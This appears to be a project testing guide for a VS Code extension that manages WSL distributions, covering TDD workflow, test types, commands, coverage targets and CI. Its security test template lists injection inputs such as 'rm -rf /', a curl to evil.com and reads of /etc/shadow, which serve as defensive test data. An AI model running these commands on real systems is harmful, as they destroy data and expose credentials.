# 🧪 VSC WSL Manager - Comprehensive Testing Guide

## Overview

This document defines the testing standards, practices, and workflows for the VSC WSL Manager extension. We follow **Test-Driven Development (TDD)** principles with a focus on achieving **100% coverage for critical paths** and maintaining **99.9% test reliability**.

**QA Manager:** Marcus Johnson
**Last Updated:** September 2024
**Coverage Target:** 80% minimum (100% for critical paths)

## Table of Contents

1. [Core Testing Principles](#core-testing-principles)
2. [Testing Architecture](#testing-architecture)
3. [Test Categories](#test-categories)
4. [TDD Workflow](#tdd-workflow)
5. [Running Tests](#running-tests)
6. [Writing Tests](#writing-tests)
7. [Coverage Requirements](#coverage-requirements)
8. [CI/CD Integration](#cicd-integration)
9. [Troubleshooting](#troubleshooting)

## Core Testing Principles

### 1. Test First, Code Second
Every feature begins with a failing test. No production code is written until there's a test that requires it.

### 2. Build to Test
Design decisions prioritize testability. If it's hard to test, it's probably poorly designed.

### 3. Coverage as Confidence
100% coverage on critical paths isn't a goal—it's a requirement. It's our confidence that the software works.

### 4. Same Tests Everywhere
Tests that pass locally MUST pass in CI. No environment-specific test behaviors.

### 5. Fast Feedback Loops
Unit tests complete in seconds, integration in minutes, E2E within 10 minutes total.

## Testing Architecture

```
┌─────────────────────────────────────────────────────┐
│                   Test Pyramid                      │
├─────────────────────────────────────────────────────┤
│                                                     │
│                    E2E Tests                        │
│              (WebdriverIO - 10%)                   │
│         ┌───────────────────────────┐              │
│                                                     │
│              Integration Tests                      │
│            (VS Code API - 30%)                     │
│      ┌────────────────────────────────┐            │
│                                                     │
│                Unit Tests                           │
│             (Jest - 60%)                           │
│  ┌──────────────────────────────────────┐          │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## Test Categories

### 🔷 Unit Tests (`test/unit/`)
- **Purpose:** Test individual functions and classes in isolation
- **Framework:** Jest with TypeScript
- **Mock Strategy:** All external dependencies mocked
- **Execution Time:** < 5 seconds for entire suite
- **Coverage Target:** 80% minimum, 100% for critical functions
- **Current Files:**
  - `commandBuilder.test.ts` - Command construction and security
  - `errorHandler.test.ts` - Error handling and user messages
  - `inputValidator.test.ts` - Input validation and sanitization
  - `securityValidator.test.ts` - Security checks and rate limiting
  - `terminalProfileManager.test.ts` - Terminal profile registration
  - `wslManager.test.ts` - Core WSL operations
  - `wslTreeDataProvider.test.ts` - Tree view data provider

### 🔗 Integration Tests (`test/integration/`)
- **Purpose:** Test component interactions with VS Code API
- **Framework:** Jest + VS Code Extension Testing API
- **Mock Strategy:** Real VS Code API, mocked system calls
- **Execution Time:** < 2 minutes
- **Coverage Target:** 70% of integration points
- **Current Files:**
  - `extension.test.ts` - Extension activation and lifecycle
  - `commandHandlers.test.ts` - Command execution flow
  - `treeView.test.ts` - Tree view integration

### 🌐 E2E Tests (`test/e2e/`)
- **Purpose:** Test complete user workflows through UI
- **Framework:** WebdriverIO with VS Code Service
- **Mock Strategy:** No mocks, real VS Code instance
- **Execution Time:** < 10 minutes
- **Coverage Target:** All critical user journeys
- **Test Types:**
  - WebdriverIO tests (`test/e2e/`)
  - Python E2E tests (`test/e2e-python/`)

### 🔒 Security Tests (`test/security/`)
- **Purpose:** Validate input sanitization and security boundaries
- **Framework:** Jest with security-focused test cases
- **Mock Strategy:** Minimal mocking to test real validation
- **Execution Time:** < 1 minute
- **Coverage Target:** 100% of security-critical code
- **Focus Areas:**
  - Command injection prevention
  - Path traversal protection
  - Rate limiting enforcement
  - Audit logging

### ✅ Validation Tests (`test/validation/`)
- **Purpose:** Verify data validation and error handling
- **Framework:** Jest with extensive edge cases
- **Mock Strategy:** Focused mocking for error conditions
- **Execution Time:** < 30 seconds
- **Coverage Target:** All validation functions

### 🔬 Real Output Tests (`test/real-output-tests/`)
- **Purpose:** Validate actual command outputs and system behaviors
- **Framework:** Jest with real system interaction
- **Mock Strategy:** No mocks, real WSL commands
- **Execution Time:** < 2 minutes
- **Coverage Target:** Core WSL operations

## TDD Workflow

### Step 1: Pick a Feature
```bash
# Check feature coverage
npm run coverage:features

# Select feature with lowest coverage
```

### Step 2: Write Failing Test
```typescript
// test/unit/services/wslService.test.ts
describe('WSL Service - Clone Distribution', () => {
    it('should clone an existing distribution', async () => {
        // Given - Setup test conditions
        const source = 'Ubuntu-22.04';
        const target = 'MyProject';

        // When - Execute the feature
        const result = await wslService.cloneDistribution(source, target);

        // Then - Assert expectations
        expect(result.success).toBe(true);
        expect(result.name).toBe(target);
    });
});
```

### Step 3: Run Test (Verify It Fails)
```bash
npm run test:watch -- wslService.test.ts
# Test should fail with "wslService.cloneDistribution is not a function"
```

### Step 4: Write Minimal Code
```typescript
// src/services/wslService.ts
export async function cloneDistribution(source: string, target: string) {
    // Minimal implementation to make test pass
    return { success: true, name: target };
}
```

### Step 5: Make Test Pass
```bash
# Test should now pass
✓ should clone an existing distribution (15ms)
```

### Step 6: Refactor with Confidence
Now add proper implementation, error handling, and validation—tests ensure nothing breaks.

### Step 7: Add Edge Cases
```typescript
it('should reject invalid distribution names');
it('should handle source distribution not found');
it('should prevent duplicate names');
```

## Running Tests

### Quick Commands

```bash
# Run all tests with coverage
npm test

# Run specific test type
npm run test:unit          # Unit tests only
npm run test:integration   # Integration tests
npm run test:e2e           # E2E UI tests (WebdriverIO)
npm run test:e2e:python    # Python E2E tests
npm run test:security      # Security tests
npm run test:validation    # Validation tests

# Run in watch mode (TDD)
npm run test:watch

# Run specific file
npm test -- wslService.test.ts

# Run tests matching pattern
npm test -- --testNamePattern="clone"

# Debug tests
npm run test:debug

# Coverage report
npm run test:coverage
npm run coverage:report    # HTML report
```

### Unified Test Runner

```bash
# Run same tests as CI
npm run test:ci

# Run comprehensive test suite
npm run test:comprehensive

# Run with specific options
npm run test:ci -- --coverage --threshold=80
```

### Python E2E Tests

```bash
# Install dependencies
npm run test:e2e:python:install

# Run all Python E2E tests
npm run test:e2e:python

# Run specific test suites
npm run test:e2e:python:activation
npm run test:e2e:python:commands

# Clean test artifacts
npm run test:e2e:python:clean
```

## Writing Tests

### Test Structure Template

```typescript
/**
 * Feature: WSL_DISTRIBUTION_MANAGEMENT
 * Priority: CRITICAL
 * Coverage Target: 100%
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { WSLManager } from '../../src/wslManager';
import { mockVscode } from '../mocks/vscode';

describe('WSLManager', () => {
    let manager: WSLManager;

    beforeEach(() => {
        // Setup - Arrange test conditions
        jest.clearAllMocks();
        manager = new WSLManager();
    });

    afterEach(() => {
        // Cleanup - Reset state
        jest.restoreAllMocks();
    });

    describe('listDistributions', () => {
        it('should return all WSL distributions', async () => {
            // Given
            const mockOutput = 'Ubuntu-22.04 Running 2\nDebian Stopped 2';
            mockExec.mockResolvedValue({ stdout: mockOutput });

            // When
            const distributions = await manager.listDistributions();

            // Then
            expect(distributions).toHaveLength(2);
            expect(distributions[0]).toMatchObject({
                name: 'Ubuntu-22.04',
                state: 'Running',
                version: 2
            });
        });

        it('should handle WSL not installed', async () => {
            // Given
            mockExec.mockRejectedValue(new Error('wsl not found'));

            // When/Then
            await expect(manager.listDistributions())
                .rejects
                .toThrow('WSL is not installed');
        });
    });
});
```

### E2E Test Template

```typescript
/**
 * E2E Test: Distribution Creation Workflow
 * User Journey: Create → Configure → Verify
 */

import { browser } from '@wdio/globals';
import { VSCodeWorkbench } from '../pageobjects/workbench';
import { WSLSidebar } from '../pageobjects/wsl-sidebar';

describe('Distribution Creation E2E', () => {
    let workbench: VSCodeWorkbench;
    let wslSidebar: WSLSidebar;

    before(async () => {
        workbench = new VSCodeWorkbench();
        wslSidebar = new WSLSidebar();
        await workbench.open();
    });

    it('should create distribution through UI', async () => {
        // Step 1: Open WSL Manager
        await wslSidebar.open();

        // Step 2: Click Create
        await wslSidebar.clickCreateButton();

        // Step 3: Select Template
        await workbench.selectQuickPickItem('Ubuntu-22.04');

        // Step 4: Enter Name
        await workbench.inputBox.setValue('TestProject');
        await workbench.inputBox.confirm();

        // Step 5: Verify Creation
        await browser.waitUntil(
            async () => await wslSidebar.hasDistribution('TestProject'),
            { timeout: 30000, timeoutMsg: 'Distribution not created' }
        );

        // Step 6: Validate State
        const distro = await wslSidebar.getDistribution('TestProject');
        expect(distro.state).toBe('Running');
    });
});
```

### Security Test Template

```typescript
describe('Security - Input Sanitization', () => {
    const maliciousInputs = [
        { input: 'test; rm -rf /', description: 'Command injection' },
        { input: 'test && curl evil.com', description: 'Command chaining' },
        { input: '../../../etc/passwd', description: 'Path traversal' },
        { input: 'test`whoami`', description: 'Command substitution' },
        { input: 'test$(cat /etc/shadow)', description: 'Subshell execution' }
    ];

    maliciousInputs.forEach(({ input, description }) => {
        it(`should prevent ${description}`, async () => {
            await expect(wslManager.createDistribution(input))
                .rejects
                .toThrow('Invalid distribution name');
        });
    });
});
```

## Coverage Requirements

### Minimum Thresholds

| Metric | Global | Critical Path | Security |
|--------|--------|---------------|----------|
| Lines | 80% | 100% | 100% |
| Branches | 80% | 100% | 100% |
| Functions | 80% | 95% | 100% |
| Statements | 80% | 100% | 100% |

### Critical Path Features

These features MUST maintain 100% coverage:

1. **Extension Activation** - Must activate cleanly
2. **Distribution Listing** - Core functionality
3. **Distribution Creation** - Primary use case
4. **Input Sanitization** - Security critical
5. **Terminal Integration** - Key feature
6. **Error Handling** - User experience critical

### Coverage Reporting

```bash
# Generate coverage report
npm run test:coverage

# View HTML report
npm run coverage:open

# Check specific file coverage
npm run coverage:file -- src/wslManager.ts

# Feature-specific coverage
npm run coverage:feature -- WSL-001
```

## CI/CD Integration

### GitHub Actions Workflow

Our CI pipeline ensures quality gates are met:

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  test:
    strategy:
      matrix:
        node: [18, 20, 22]
        os: [windows-latest]

    steps:
      - name: Run Tests
        run: npm run test:ci

      - name: Coverage Gate
        run: npm run coverage:check

      - name: E2E Tests
        if: github.event_name == 'push'
        run: npm run test:e2e
```

### Pre-commit Hooks

```bash
# Install pre-commit hooks
npm run hooks:install

# Hooks run automatically on commit:
# 1. Lint check
# 2. Type check
# 3. Unit tests for changed files
# 4. Coverage verification
```

## Test Data Management

### Fixtures

```typescript
// test/fixtures/distributions.ts
export const validDistribution = {
    name: 'Ubuntu-22.04',
    state: 'Running',
    version: 2,
    defaultUser: 'ubuntu'
};

export const stoppedDistribution = {
    ...validDistribution,
    state: 'Stopped'
};
```

### Test Builders

```typescript
// test/builders/distribution.builder.ts
export class DistributionBuilder {
    private distribution = { ...validDistribution };

    withName(name: string): this {
        this.distribution.name = name;
        return this;
    }

    withState(state: string): this {
        this.distribution.state = state;
        return this;
    }

    build(): Distribution {
        return { ...this.distribution };
    }
}

// Usage
const testDistro = new DistributionBuilder()
    .withName('TestProject')
    .withState('Running')
    .build();
```

## Performance Benchmarks

| Test Type | Target Time | Max Time | Current |
|-----------|------------|----------|---------|
| Unit (all) | < 5s | 10s | ~8s |
| Integration (all) | < 2min | 5min | ~3min |
| E2E (all) | < 5min | 10min | ~7min |
| Single unit test | < 50ms | 200ms | ~30ms |
| Test suite startup | < 1s | 3s | ~1.5s |

## Troubleshooting

### Common Issues

#### Tests Timing Out
```bash
# Increase timeout for specific test
jest.setTimeout(30000); // 30 seconds

# Or in test
it('long running test', async () => {
    // test code
}, 30000);
```

#### Mock Not Working
```bash
# Clear Jest cache
npm run test:clear-cache

# Verify mock path
console.log(jest.mock.calls);
```

#### Coverage Not Generated
```bash
# Force coverage collection
npm test -- --coverage --collectCoverageFrom='src/**/*.ts'

# Check coverage config
npm run coverage:debug
```

#### E2E Tests Failing
```bash
# Run in debug mode
npm run test:e2e:debug

# Check VS Code version
code --version

# Verify WebDriver
npm run wdio:doctor
```

#### Python E2E Tests Issues
```bash
# Ensure project is under /mnt/c/ (Windows-accessible)
pwd

# Check Python installation on Windows
cmd.exe /c "python --version"

# Verify VS Code installation
cmd.exe /c "code --version"

# Clean and retry
npm run test:e2e:python:clean
npm run test:e2e:python
```

## Best Practices

### ✅ DO

- Write tests before code (TDD)
- Use descriptive test names that explain the scenario
- Follow AAA pattern: Arrange, Act, Assert
- Keep tests isolated and independent
- Mock external dependencies in unit tests
- Use fixtures for consistent test data
- Run tests locally before pushing
- Update coverage metrics after adding tests

### ❌ DON'T

- Write tests after implementation
- Use generic test names like "should work"
- Share state between tests
- Mock everything (integration tests need some real components)
- Use hard-coded values when fixtures exist
- Skip tests without filing an issue
- Ignore flaky tests (fix or remove them)
- Commit with failing tests

## Quality Metrics

Track these metrics weekly:

| Metric | Target | Current |
|--------|--------|---------|
| Test Reliability | 99.9% | ~98% |
| Coverage (Overall) | 80% | ~75% |
| Coverage (Critical) | 100% | ~90% |
| Test Execution Time | <10min | ~8min |
| Flaky Test Rate | <0.1% | ~0.5% |
| Test Maintenance Time | <10% of dev time | ~15% |

## Test Organization

### Directory Structure
```
test/
├── unit/                    # Isolated component tests
│   ├── commands/           # Command handler tests
│   ├── providers/          # Tree provider tests
│   ├── services/           # Service layer tests
│   └── utils/              # Utility function tests
├── integration/            # Component integration tests
│   ├── extension/          # Extension lifecycle tests
│   └── vscode/             # VS Code API integration
├── e2e/                    # WebdriverIO UI tests
│   ├── specs/              # Test specifications
│   └── pageobjects/        # Page object models
├── e2e-python/            # Python-based E2E tests
│   ├── test_*.py           # Test files
│   └── vscode_helper.py    # VS Code automation helper
├── security/              # Security-focused tests
├── validation/            # Input validation tests
├── real-output-tests/     # Tests with real WSL
├── fixtures/              # Shared test data
├── mocks/                 # Shared mocks
├── builders/              # Test data builders
└── setup.ts               # Jest setup file
```

## Resources

- [Jest Documentation](https://jestjs.io/)
- [WebdriverIO VS Code Service](https://webdriver.io/docs/vscode-service)
- [VS Code Extension Testing](https://code.visualstudio.com/api/working-with-extensions/testing-extension)
- [TDD Best Practices](https://martinfowler.com/bliki/TestDrivenDevelopment.html)
- [Python E2E Testing Guide](./docs/testing/PYTHON_E2E_GUIDE.md)

---

*"Quality isn't just about finding bugs—it's about building confidence that software will work as expected for real users."*
— Marcus Johnson, QA Manager